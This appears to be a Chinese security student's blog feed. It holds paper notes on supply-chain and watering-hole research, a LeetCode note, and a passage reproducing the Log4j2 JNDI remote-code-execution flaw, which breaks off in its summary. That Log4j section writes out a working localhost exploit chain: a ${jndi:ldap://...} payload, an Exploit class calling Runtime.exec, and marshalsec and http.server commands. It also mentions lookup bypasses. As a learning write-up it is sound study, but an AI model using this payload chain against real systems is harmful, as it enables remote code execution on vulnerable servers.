<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PR - Are Software Dependency Supply Chain Metrics Useful in Predicting Change of Popularity of NPM Packages?</title>
      <link href="/2022/03/09/Are%20Software%20Dependency%20Supply%20Chain%20Metrics%20Useful%20in%20Predicting%20Change%20of%20Popularity%20of%20NPM%20Packages/"/>
      <url>/2022/03/09/Are%20Software%20Dependency%20Supply%20Chain%20Metrics%20Useful%20in%20Predicting%20Change%20of%20Popularity%20of%20NPM%20Packages/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：T Dey, A Mockus</em></p><p><em>原文标题：Are Software Dependency Supply Chain Metrics Useful in Predicting Change of Popularity of NPM Packages?</em></p><p><em>原文链接：<a href="https://dl.acm.org/doi/abs/10.1145/3273934.3273942">https://dl.acm.org/doi/abs/10.1145/3273934.3273942</a></em></p><p><em>原文来源：PROMISE&#39;18</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>一个软件是否有用、是否受到大众喜爱和追捧，取决于其使用率，而其流行程度需要根据其活跃用户数量来衡量。但除非这些软件尝试追踪并评估其用户活跃度，否则这些活跃用户数量是难以直接准确地统计的。除了考虑活跃用户数量以外还有没有能用于衡量软件流行程度的呢？下载量也许是一个不错的答案，也是最接近软件受欢迎程度内涵的一个数据。  </p><p>作者关注到NPM分发的JavaScript包存在着比较复杂的依赖关系，即一个包可能是其他包运行时或开发时的依赖。这种依赖关系网络会影响到单个软件包的下载数量，当用户安装一个软件包的时候，会同时安装其依赖项。因此分析一个体量超过600K的生态系统中软件包的流行程度面临着巨大的困难。</p><p><strong>RQ: 上下游依赖项的下载量是否有助于预测NPM中流行的JavaScript包的下载量？</strong></p><h2 id="0x02-Data"><a href="#0x02-Data" class="headerlink" title="0x02 Data"></a>0x02 Data</h2><p>所有用于研究的数据均采自npms.io的API，作者只关注了那些至少有一个上游依赖和一个下游依赖的包，最终在60多万个包中，找出了72,211个符合其标准的软件包。数据收集过程涵盖了2017年12月1日至2018年3月15日之间的日期，分别于月初和月中收集这部分NPM软件包的信息，从而产生对应的软件包快照，共计8个可用快照（能够用于预测当前和下个月下载比例的快照需要排除最后两个快照）。</p><p>从npms.io上收集的数据包括Github仓库信息，这其中又有Issue数、每周/月/季度/半年/年的提交数、贡献者名单和贡献者提交数、Branch数和Star数。除此之外，还采集到了软件包的元数据，包括运行时/开发时的依赖列表、月度/季度/半年度/年度/总计发布数量、作者姓名邮件、README等等。对于一些由npms.io计算的评价指标，作者并没有使用。而对于发布和提交的数量，作者根据PCA分析只用了每月和每年的数字。</p><p>为了保持前后一致性，作者考虑到通常NPM安装某个软件包的时候会优先使用本地缓存，也就是说，这些安装是不会计入软件包的下载量的。于是根据建议“只有当一个NPM包的下载量大于50次/天的时候，才认为是值得纳入考虑范围的软件包”作者进一步过滤出了12,999个软件包。</p><h2 id="0x03-Analysis"><a href="#0x03-Analysis" class="headerlink" title="0x03 Analysis"></a>0x03 Analysis</h2><p>作者分两步对所有数据进行了分析。首先对6个快照中的每一个快照单独进行线性回归，并比较结果。在这一步中只做模型拟合，而没有进行预测。第二部作者合并了6个快照的数据，并附增一个“日期”变量以考虑时间因素，输入至一个随机森林模型中进行预测。同时，调研了特征重要性，如下图。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/b04c7726-07c2-4b87-815a-5951e3b91dbb.png"></p><p>实验结果显示，当使用随机森林模型（包含所有变量）来预测下载量是否会增加时，ROC曲线下AUC 0.73，敏感性和特异性值为0.66和0.56。而当不包含这些引入的变量时，ROC曲线下AUC值、敏感性和特异性值为0.65、0.59和0.53。</p><h2 id="0x04-Conclusion"><a href="#0x04-Conclusion" class="headerlink" title="0x04 Conclusion"></a>0x04 Conclusion</h2><p>作者旨在通过软件供应链的视角更好地理解这些软件生态系统的行为，并模拟软件依赖网络的影响如何影响JavaScript软件包的下载变化。其使用线性回归和随机森林模型分析了2017年12月1日至2018年3月15日期间NPM中的12,999个流行包，并研究了代表软件依赖性供应链不同方面的预测因素对包的下载数量变化的影响。初步结果表明，上游和下游运行时依赖的数量和下载量对该软件包下载量的变化有很大的影响，以更少、更受欢迎的软件包为依赖（上游或下游）的软件包的下载量大概率会缓步上升。读者在阅读了这份研究报告后发现作者在考虑纳入统计的NPM包的时候其实并未对包的类型稍作区分（纯构建软件包、大型系统的组件软件包等），这些类型也许会对依赖关系以及包的流行程度评估问题上产生较大的影响。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NPM </tag>
            
            <tag> Supply Chain </tag>
            
            <tag> PROMISE 2018 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Mnemosyne: An Effective and Efficient Postmortem Watering Hole Attack Investigation System</title>
      <link href="/2022/03/03/Mnemosyne%20-%20An%20Effective%20and%20Efficient%20Postmortem%20Watering%20Hole%20Attack%20Investigation%20System/"/>
      <url>/2022/03/03/Mnemosyne%20-%20An%20Effective%20and%20Efficient%20Postmortem%20Watering%20Hole%20Attack%20Investigation%20System/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：J Allen, Z Yang, M Landen, R Bhat, H Grover</em></p><p><em>原文标题：Mnemosyne: An Effective and Efficient Postmortem Watering Hole Attack Investigation System</em></p><p><em>原文链接：<a href="https://dl.acm.org/action/doi/pdf/10.1145/3372297.3423355">https://dl.acm.org/action/doi/pdf/10.1145/3372297.3423355</a></em></p><p><em>原文来源：CCS 2020</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>本文聚焦于“水坑攻击”，其通常作为杀伤链中初始阶段的主要技术之一，将一个被攻陷的网站当作垫脚石从而进入目标组织网络。现有的一些研究尝试将那些被攻陷的网站与正常网站进行比较以找出攻击者所做的恶意修改，但作者认为，仅仅检测网站是否被攻陷以及是否被恶意修改只包括了调查而不包括取证。</p><p>经过调研后，作者认为检测水坑攻击以及重构其攻击过程主要有两大挑战：一是现有用于攻击重构的系统通常收集并跟踪系统级信息流的审计日志，并且严重倾向于依赖低级语义，包括进程、套接字和系统调用等。但正是因为其对于低级语义的依赖导致了其无法准确理解与浏览器内Javascript执行有关的细节，限制了其重构复杂攻击的能力；二是水坑攻击具有高度的针对性，在取证调查的早期很难确定哪些访问者才是攻击者真正的目标。作者认为仅仅是检测一个网站是否被攻击者攻陷了是不够的，对于此网站的访问组织来说，他们更关心这个被攻陷的网站在访问时是否会对组织有何不利影响。但是想要独立完成这项调查并不简单，因为服务端的日志对于这些组织来说是透明的。</p><h2 id="0x02-Mnemosyne"><a href="#0x02-Mnemosyne" class="headerlink" title="0x02 Mnemosyne"></a>0x02 Mnemosyne</h2><p>作者提出了Mnemosyne（希腊神话中的记忆女神），一个被水坑攻击后用于取证分析的工具，依赖浏览器端审计日志进行重构、调查和评估水坑攻击，结构如下图。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/86b04540-b19d-4eba-a38d-f8413e040919.png"></p><p>第一部分是浏览器端审计守护程序，它被部署在组织的每个终端系统上，以监测网络浏览活动。审计守护程序会在每个终端的浏览会话中被动地收集审计日志，这些审计日志会被收集并存储在一个负责维护安全审计信息的后台服务器上。第二部分是用于跟踪和分析外部网站行为的版本控制系统，它将结合第一步收集到的浏览器级别的审计日志来确定网站是何时沦陷的以及攻击者做了哪些恶意修改。具体来说，版本控制系统重现了沦陷网站是如何随着时间一步步被攻击者攻陷的，这能够帮助取证人员快速确定入侵窗口期。最后一部分是用户级分析模块，它基于一个可疑版本列表，判断当用户访问网站时网站的行为是否恶意。</p><p>针对第一部分提到的两个挑战，Mnemosyne分别用以下方式进行解决：</p><ol><li><p>Mnemosyne收集审计日志，以浏览器级别的语义来捕捉信息，包括页面、脚本、域等。虽然在此之前已有许多针对浏览器的审计系统，但其中多数需要对浏览器本身进行很多修改，这样做在实验环境下表现良好却不适用于现实世界。相比之下，Mnemosyne以一种无需修改浏览器的轻量级方法，利用现有基于Chromium的浏览器已提供的调试接口构建审计系统，更容易在现实世界中部署。</p></li><li><p>Mnemosyne以一种轻量级的审计方法，在用户的浏览会话期间被动地收集审计日志。为了使得这项调查审计尽可能高效，Mnemosyne对收集到的审计日志应用了一套差异分析方法，以快速确定该组织的哪些员工才是攻击者真正的目标。</p></li></ol><p><strong>Techniques: Auditor Daemon</strong><br>作者所提出的审计守护程序与传统需要修改浏览器的程序不同，其仅仅依赖于由Chromium提供的DevTools调试接口来获取有关用户浏览会话的信息，并将其作为审计日志存储下来，具体捕获的事件如下表。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/987b456c-7e13-488b-ac66-d2c7f5548bdd.png"></p><p><strong>Techniques: Browser-level Causality Graph</strong><br>作为攻击重构的第一步，作者基于浏览器级的审计日志构建了因果关系图，用于分析和调查，如下表所示。</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/d5e890a9-a7c4-49f0-a164-53bb29dff37b.png" width="70%"/>  <img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/0ff5a0f8-ec96-43f5-92bf-6d5637aa526f.png" width="70%"/> <p>这种图式结构能够反映出浏览器事件链以及其产生的因果关系。以社会工程攻击为例子，如下图所示，主要有三个阶段：第一阶段是对用户进行指纹识别，以确定是否是目标用户；第二阶段尝试模糊原始网站的内容，在DOM中注入一个恶意的覆盖层，将用户重定向到一个精心仿照过的网站下；第三阶段欺骗用户进行登陆等操作，以获取用户敏感数据。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/01463d84-3f8c-4020-901a-42db1e698c00.png"></p><p><strong>Techniques: Versioning System</strong>  </p><p>基于域的版本控制系统将所有客户端审计日志信息中的域名信息抽出，按照一定的加权评分方式统计那些网站的可疑版本，即尝试找出可疑变化时间窗口。这套加权评分系统的主要运作方式是将基于浏览器级的审计日志与ATT&amp;CK框架中现有的攻击模式相匹配，涉及的TTP集以及映射所需的pattern如下表。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/76baf8d2-b972-4c84-a62b-dd0d225bd18a.png"></p><p><strong>Techniques: User-Level Analysis</strong><br>用户级分析的目的主要是根据访问用户浏览器中的会话记录来确定同一网站是否在不同用户访问时表现不一。下表就表现了普通用户访问和目标用户访问时，网站所表现出的区别。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/cd5eb4a2-ac64-42ae-8dfa-ee5f3ff8d233.png"></p><h2 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h2><p>作者在现实世界中尝试部署了这套系统，并且得到了一些攻击场景在野案例，如下表。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/2db50aec-4345-4dc0-9ec2-9c53339a75fd.png"></p><p>读者在读完整篇文章后有一个想法，如果说攻击者在拿下了该网站后，替换掉其中正常下载的文件，比如替换掉网站正常提供下载的一个word文件。通过这种方式不就绕过了系统中版本控制那一部分的加权评分系统从而被识别为一个正常的版本了。当然，针对大多数通过操纵DOM完成页面替换的攻击，此方法思路清晰有效。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CCS </tag>
            
            <tag> Watering Hole Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NS - Leetcode Notes</title>
      <link href="/2022/02/24/Coding/"/>
      <url>/2022/02/24/Coding/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>从零开始的Leetcode刷刷乐</em></p><p><em>看心情用Python3或者散装Java</em></p><p><em>笔记作者：outx</em></p><p><em>最后一次更新于2022-02-24</em></p></blockquote><h2 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a><a href="https://leetcode-cn.com/problems/two-sum/">两数之和</a></h2><blockquote><p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p><p>你可以按任意顺序返回答案。</p><p>示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [2,7,11,15], target = 9</span><br><span class="line">输出：[0,1]</span><br></pre></td></tr></table></figure></blockquote><h3 id="我的代码"><a href="#我的代码" class="headerlink" title="我的代码"></a>我的代码</h3><p>思路：就是一个二重遍历，显然很low</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        <span class="keyword">for</span> pos1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">for</span> pos2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> (nums[pos1]+nums[pos2] == target) &amp; (pos1 != pos2):</span><br><span class="line">                    <span class="keyword">return</span> [pos1, pos2]</span><br></pre></td></tr></table></figure><h3 id="优秀代码"><a href="#优秀代码" class="headerlink" title="优秀代码"></a>优秀代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums, target</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hashmap = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> index, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">            another_num = target - num <span class="comment"># 这里是比较好的思路，先找出另一个数字是什么，再从先前存放过的数字的hashmap中去找，这样只用遍历一次即可</span></span><br><span class="line">            <span class="keyword">if</span> another_num <span class="keyword">in</span> hashmap:</span><br><span class="line">                <span class="keyword">return</span> [hashmap[another_num], index]</span><br><span class="line">            hashmap[num] = index</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">      </span><br><span class="line"><span class="comment"># enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RePR - LastPyMile: Identifying the Discrepancy between Sources and Packages</title>
      <link href="/2022/02/23/Re-LastPyMile:%20Identifying%20the%20Discrepancy%20between%20Sources%20and%20Packages/"/>
      <url>/2022/02/23/Re-LastPyMile:%20Identifying%20the%20Discrepancy%20between%20Sources%20and%20Packages/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：Duc-Ly Vu, Fabio Massacci, Ivan Pashchenko, Henrik Plate</em></p><p><em>原文标题：LastPyMile: Identifying the Discrepancy between Sources and Packages</em></p><p><em>原文链接：<a href="https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=research_activities:experiments:esecfse2021.pdf">https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=research_activities:experiments:esecfse2021.pdf</a></em></p><p><em>原文来源：ESEC/FSE 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><p>好论文再读再品又是另一些发现 - 220223</p><h2 id="0x00-Intro"><a href="#0x00-Intro" class="headerlink" title="0x00 Intro"></a>0x00 Intro</h2><p>通常情况下开源的软件包会在其对应的存储库上提供源代码，但开发者往往更倾向于使用集成式的包管理器来使用这些开源软件包（PyPI对应的pip）。这种方便的做法是假设源代码和软件包之间没有差异的，这会带来一定的安全风险。作者提出并实现了一种方法，名为LastPyMile，主要用于识别软件包的构造和其源代码库之间的差异，以防止恶意软件的注入。</p><h2 id="0x01-Background"><a href="#0x01-Background" class="headerlink" title="0x01 Background"></a>0x01 Background</h2><p>作者背调了目前软件供应链的情况，多达99%的代码库包含开源代码，85%到97%的企业代码库包含开源代码。正是因为开源代码的流行，方便了开发者根据具体情况基于其他开发者预先构建好的开源软件包进行自身软件构建。</p><p>通常来说，这些开源软件包的源代码和其实际包中的代码是没有任何差异的。但实际上，手动或自动构建工具，亦或是出于一些恶意目的，这两者之间是可能会存在着差异性的，如下表。可以看到正常软件包的发布版本相较于其源代码的变动是很小的，而恶意软件包则有很明显的误差。</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/2b3d0c73-74d9-4a3b-a99a-e88ce8104e4d.png" width="70%" height="70%" /><p>作者通过调研PyPI生态，研究了一个PyPI包从开发、构建到发布和安全审查的过程，如下图所示。对于PyPI来说，其在软件包在上传过程中通常只会检查一个setup.py文件，但在真实世界中，能够注入恶意代码的地方远远不止setup.py文件。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/8547a72b-1ea1-45be-b4a1-ccbb992c368d.png"></p><p>但不论如何，代码注入攻击中，考虑到注入的隐蔽性，通常只会修改原本代码中的一小部分。这也是作者的研究聚焦点。</p><h2 id="0x02-Method"><a href="#0x02-Method" class="headerlink" title="0x02 Method"></a>0x02 Method</h2><h3 id="RQ1-是否存在一种方法能够有效地识别其中的差异性？"><a href="#RQ1-是否存在一种方法能够有效地识别其中的差异性？" class="headerlink" title="RQ1: 是否存在一种方法能够有效地识别其中的差异性？"></a>RQ1: 是否存在一种方法能够有效地识别其中的差异性？</h3><p>有一种现成的解决方案，即git log，但是想要拿到完整的信息需要遍历所有git日志中的修订，且在这个过程中每次调用都会产生一个进程，这无疑是增加了分析机器的负担。作者的解决办法则是通过巧妙地结合软件包和运行软件的所有必需项目的散列值，以一种可扩展的方式提取这些差异。</p><p><strong>Answer</strong><br>作者提出了一种方法用于解答这个问题，将其命名为LastPyMile，整体框架如下。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/754804b7-7d32-4a71-b550-66ed0d5ef99a.png"></p><p>图的上半部分展示了包存储库（如PyPI）中安全审查的典型过程，主要是识别软件项目发布期间可能会出现的可疑组件。而在图的下半部分则展示了LastPyMile是如何增强传统安全审查过程的，具体步骤包括：</p><ol start="0"><li>在预备过程中，LastPyMile会在各处收集PyPI包的Github链接，包括元数据、主页以及包内。</li><li>遍历该包Github代码库中所有历史commit，以计算所有文件的哈希值并收集代码库中文件行数。</li><li>在收集了Github代码库中所有文件的哈希值和行数后，对PyPI包进行拆解，计算其中组件哈希值并切收集文件行数。</li><li>对于PyPI包中组件哈希值和行数与代码库中文件哈希值和行数，以确定其差异性。</li></ol><h3 id="RQ2-源代码和包存储库之间的“正常”差异有多大？"><a href="#RQ2-源代码和包存储库之间的“正常”差异有多大？" class="headerlink" title="RQ2: 源代码和包存储库之间的“正常”差异有多大？"></a>RQ2: 源代码和包存储库之间的“正常”差异有多大？</h3><p>作者研究了PyPI生态中超过2000个流行的软件包，这种差异是普遍存在的。但在Python源文件中一般只会发生很少的修改，所以作者采用审查作为替代方案。</p><p><strong>Answer</strong>  </p><ol><li>比较PyPI中的代码和相应的源代码库，平均有5.8%的运行时需要文件和2.6%的普通文件有差异。</li></ol><p>作者提到了可疑APIs的调用，说不能简单地将调用定义为可疑，会产生大量告警。这里存疑，因为告警和漏报的平衡点实在是很难界定。不过作者给出了差异性最大的文件名，如下表。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/86560a0d-be0c-494a-a98d-a46dcfda92ed.png" width="50%" height="50%" /></p><h3 id="RQ3-LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？"><a href="#RQ3-LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？" class="headerlink" title="RQ3: LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？"></a>RQ3: LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？</h3><p><strong>Answer</strong><br>为了在该领域发挥效力，应该允许开发者和开发组织使用相同的工具来扫描软件包的源代码库，作为其审查过程的一部分。结合LastPyMile可以显著降低现有检测软件的告警数量</p><h2 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h2><p>作者调研了已发布的PyPI包和源代码库之间的差异性，以了解软件发布过程中恶意代码注入的安全风险。但作者表明这其中还是会有些问题，比如恶意代码还可以隐藏在网页、项目配置文件等其他位置，甚至是requirements.txt中。读者在读完这篇文章后也同样认为只考虑了py文件中的差异性其实是不够的，一旦攻击者提前上传一个恶意包，然后通过修改requirements.txt引入该恶意包便能轻松绕过这种检测方式，这里还需要深入研究PyPI包的安装和导入过程，制定更加全面的检测方法。</p>]]></content>
      
      
      <categories>
          
          <category> Re Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> ESEC/FSE 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VA - Log4j2 RCE</title>
      <link href="/2021/12/15/Log4j%20Analysis/"/>
      <url>/2021/12/15/Log4j%20Analysis/</url>
      
        <content type="html"><![CDATA[<blockquote><p>漏洞预警发布的第一天，网上就已经有了poc了，也算是火出圈了，受影响的服务真的是太多了。本打算第二天调试后便写一写记录，结果一直因为各种事拖到今天，读研真是太难了。</p></blockquote><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>从零开始，Steps</p><p>从IDEA里新建一个project，选择maven项目，不使用模板，默认创建就好。然后新建需要的测试类，exp的类可以随意放，这里我为了方便就放到同一目录下了，这是最终的目录结构</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214173249211.png" alt="image-20211214173249211" style="zoom:50%;" /><p>其中log4j代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Logger log = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        log.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:9999/Exploit&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit代码（简单弹个计算器）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmd = <span class="string">&quot;open -a /System/Applications/Calculator.app&quot;</span>;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            p.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用marshalsec进行jndi注入，首先javac编译生成class文件，再启动一个临时http服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175110927.png" alt="image-20211214175110927" style="zoom:50%;" /><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/\#Exploit 9999</span><br></pre></td></tr></table></figure><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175019635.png" alt="image-20211214175019635" style="zoom: 50%;" /><p>最后执行log4j:main()</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175344848.png" alt="image-20211214175344848" style="zoom: 50%;" /><p>这里有一个很奇怪的情况，python启起来的http服务并不会显示marshalsec转发过来的请求</p><h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214193423862.png" alt="image-20211214193423862" style="zoom:33%;" /><p>入口函数为logIfEnabled，除了error调用之外，还有info、debug、fatal、log、trace、warn</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214193516207.png" alt="image-20211214193516207"></p><p>但在测试后发现，以trace为例子，在这里的intLevel会导致返回false，从而直接结束整个代码流程</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214194632121.png" alt="image-20211214194632121" style="zoom:50%;" /><p>这里的this.intLevel应该是默认的200，而level.intLevel具体为：</p><table><thead><tr><th align="left">Standard Level</th><th align="left">intLevel</th></tr></thead><tbody><tr><td align="left">OFF</td><td align="left">0</td></tr><tr><td align="left">FATAL</td><td align="left">100</td></tr><tr><td align="left">ERROR</td><td align="left">200</td></tr><tr><td align="left">WARN</td><td align="left">300</td></tr><tr><td align="left">INFO</td><td align="left">400</td></tr><tr><td align="left">DEBUG</td><td align="left">500</td></tr><tr><td align="left">TRACE</td><td align="left">600</td></tr><tr><td align="left">ALL</td><td align="left">Integer.MAX_VALUE</td></tr></tbody></table><p>所以网上说的大部分能触发是有问题的（当然，修订过配置的另说🥺），默认情况下fatal和error可以触发</p><p>言归正传，根据调用栈，跟着走一遍大概就能理清楚整个流程</p><p>这里主要记录下核心的关键点，一是format函数</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214200656183.png" alt="image-20211214200656183"></p><p>主要是看到下断点这里，他对${这两个紧邻的字符做了检测，一旦匹配到类似于表达式结构的字符串就会触发下面流程中的替换机制(this.config.getStrSubstitutor.replace)</p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214201000993.png" alt="image-20211214201000993" style="zoom:50%;" /><p>来看详细的函数内初始化情况</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214201314019.png" alt="image-20211214201314019"></p><p>可以看到其定义了prefixMatcher为[$, {]，suffixMatcher为[}]，这里的目的是把${}中间的字符串抠出来，以将varName的值赋为jndi:ldap://127.0.0.1:9999/Exploit，并随后传递给this.resolveVariable()，而这个函数又做了一件什么事呢，看下面</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204056033.png" alt="image-20211214204056033"></p><p>支持的resolver有date、java、marker、ctx、lower、upper、jndi、main、jvmrunargs、sys、env、log4j，其中lower和upper也是后面用来绕过常用的方法，更进一步</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204305707.png" alt="image-20211214204305707"></p><p>可以看到这里是写死了匹配第一个:的，作为prefix，然后会对应去找其实现，我这里是jndi，故后续都是走的JndiLookup类，后续如图，直到调用原生lookup函数</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204552398.png" alt="image-20211214204552398"></p><p>至此结束</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这应该算得上是我第一次学习和调试Java 